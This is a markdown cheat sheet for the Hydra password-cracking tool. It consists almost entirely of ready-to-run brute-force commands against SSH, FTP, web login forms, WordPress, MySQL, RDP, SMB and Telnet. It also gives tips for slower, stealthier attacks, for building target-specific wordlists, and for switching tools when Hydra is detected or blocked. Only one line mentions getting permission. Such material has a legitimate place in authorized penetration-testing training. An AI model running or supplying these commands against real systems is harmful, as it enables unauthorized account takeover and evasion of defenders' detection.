# Hydra Cheat Sheet: The Password Cracking King

Hydra is a fast and flexible network logon cracker. It's great for brute-forcing passwords on various services.

## Basic Syntax
```bash
hydra [options] <service://server> <username or list> <password or list>
```

---

## 1. Most Common Attacks

### SSH Brute Force
```bash
# Attack a single user with a password list
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.100

# Attack a user list with a single password
hydra -L users.txt -p "password123" ssh://192.168.1.100

# Attack with a user list and password list
hydra -L users.txt -P passwords.txt ssh://192.168.1.100

# Specify port (if not default 22)
hydra -l admin -P passwords.txt ssh://192.168.1.100 -s 2222
```

### HTTP Login Forms
```bash
# Basic POST request (most common)
hydra -l admin -P passwords.txt 192.168.1.100 http-post-form "/login:username=^USER^&password=^PASS^:Invalid"

# GET request
hydra -l admin -P passwords.txt 192.168.1.100 http-get-form "/login:user=^USER^&pass=^PASS^:Invalid"

# With custom success/failure messages
hydra -l admin -P passwords.txt 192.168.1.100 http-post-form "/login:user=^USER^&pass=^PASS^:Invalid password|Login failed"
```

### FTP Brute Force
```bash
# Anonymous login check first!
ftp 192.168.1.100
# Try username: anonymous, password: anonymous or blank

# Then brute force
hydra -L users.txt -P passwords.txt ftp://192.168.1.100

# Specific user
hydra -l admin -P passwords.txt ftp://192.168.1.100
```

---

## 2. Important Options

| Option | Description | Example |
|--------|-------------|---------|
| `-l` | Single username | `-l admin` |
| `-L` | Username list file | `-L users.txt` |
| `-p` | Single password | `-p password123` |
| `-P` | Password list file | `-P rockyou.txt` |
| `-s` | Port number | `-s 8080` |
| `-t` | Tasks (parallel connections) | `-t 16` |
| `-V` | Verbose mode (show attempts) | `-V` |
| `-f` | Stop after first found login | `-f` |
| `-vV` | Very verbose (show each attempt) | `-vV` |
| `-e` | Additional checks | `-e nsr` |

### The `-e` flag options:
- `n` - try null password
- `s` - try the login as password
- `r` - try reverse login as password

```bash
# Try "admin", "admin admin", and blank password
hydra -l admin -P passwords.txt -e nsr ssh://192.168.1.100
```

---

## 3. Service-Specific Examples

### WordPress Login
```bash
hydra -L users.txt -P passwords.txt 192.168.1.100 http-post-form \
"/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:The password you entered"
```

### Basic HTTP Authentication
```bash
hydra -L users.txt -P passwords.txt 192.168.1.100 http-get /admin
```

### MySQL Database
```bash
hydra -L users.txt -P passwords.txt mysql://192.168.1.100
```

### RDP (Windows Remote Desktop)
```bash
hydra -L users.txt -P passwords.txt rdp://192.168.1.100
```

### SMB (Windows File Sharing)
```bash
hydra -L users.txt -P passwords.txt smb://192.168.1.100
```

### Telnet
```bash
hydra -L users.txt -P passwords.txt telnet://192.168.1.100
```

---

## 4. Performance Tuning

```bash
# Faster attack with more parallel connections (default: 16)
hydra -l admin -P passwords.txt -t 32 ssh://192.168.1.100

# Slower/stealthier attack (fewer connections)
hydra -l admin -P passwords.txt -t 4 ssh://192.168.1.100

# Wait between attempts (milliseconds)
hydra -l admin -P passwords.txt -w 100 ssh://192.168.1.100
```

---

## 5. Practical Examples

### Attack SSH with Common Passwords
```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt -t 4 -V ssh://192.168.1.100
```

### Attack Web Form with Username List
```bash
hydra -L users.txt -p "password123" -V 192.168.1.100 http-post-form \
"/login:username=^USER^&password=^PASS^:Invalid"
```

### Quick WordPress Attack
```bash
hydra -l admin -P /usr/share/wordlists/common_passwords.txt -f -V \
192.168.1.100 http-post-form \
"/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:ERROR"
```

### Stealthy Attack
```bash
hydra -l admin -P passwords.txt -t 2 -w 30 -V ssh://192.168.1.100
```

---

## 6. Finding the Right Form Parameters

1. **Intercept the login request with Burp Suite**
2. **Note the:**
   - URL path (`/login`)
   - Parameters (`user=admin&pass=password`)
   - Failure response ("Invalid login")

3. **Build your hydra command:**
```
http-post-form "/login:user=^USER^&pass=^PASS^:Invalid login"
```

---

## 7. Tips & Best Practices

1. **Always get permission** before attacking
2. **Start with common passwords** first (`rockyou.txt`)
3. **Use `-t` carefully** - too many threads can crash services
4. **Try `-e nsr`** to catch easy passwords
5. **Check for lockout policies** - don't lock accounts
6. **Use `-f`** to stop after first success
7. **Save results** with `-o output.txt`

---

## 8. Password List Management

### Common Wordlists Location:
```bash
/usr/share/wordlists/
/usr/share/wordlists/rockyou.txt
/usr/share/wordlists/dirbuster/*
/usr/share/wordlists/metasploit/*
```

### Create Custom Wordlists:
```bash
# Based on target website content
cewl http://target.com -w custom_words.txt

# Common password patterns
crunch 6 8 1234567890 -o numbers.txt
```

---

## 9. Alternative Tools

If Hydra is too loud or gets blocked, try:
```bash
# Medusa (similar to Hydra)
medusa -h 192.168.1.100 -U users.txt -P passwords.txt -M ssh

# Patator (more stealthy)
patator ssh_login host=192.168.1.100 user=admin password=FILE0 0=passwords.txt

# Ncrack (from Nmap team)
ncrack ssh://192.168.1.100 -U users.txt -P passwords.txt
```
